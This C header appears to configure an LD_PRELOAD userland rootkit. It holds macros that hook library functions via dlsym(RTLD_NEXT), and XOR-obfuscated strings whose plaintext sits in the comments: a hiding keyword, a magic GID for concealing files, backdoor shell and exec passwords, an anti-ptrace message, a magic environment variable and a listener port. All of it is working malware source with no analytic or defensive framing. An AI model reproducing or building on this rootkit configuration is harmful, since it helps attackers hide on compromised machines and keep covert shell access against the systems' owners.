#define DEBUG
#ifndef RTLD_NEXT
#define RTLD_NEXT ((void *) -11) 
#endif
#define HOOK(func) old##_##func = dlsym(RTLD_NEXT, #func)
#define CLEAN(var) clean(var, strlen(var))
#define MAGIC "\x47\x45\x59\x42\x43" // moshi
#define PROC "\x5\x5a\x58\x45\x49"
#define MAGICGID 1337
#define EXECPW "\x43\x44\x59\x5e\x4b\x46\x46\x4d\x4f\x44\x5e\x45\x45" // installgentoo
#define SHELLPW "\x48\x46\x1b\x44\x4d" // bl1ng
#define DEFAULT_PORT	61040
#define IP		"127.0.0.1"

//important strings
#define PTRACE_MSG "\x48\x46\x1b\x44\x4d\xa\x48\x46\x1b\x44\x4d" // bl1ng bl1ng
#define MAGICENV "\x45\x46\x4e\x47\x49\x4e\x45\x44\x4b\x46\x4e" // oldmcdonald 
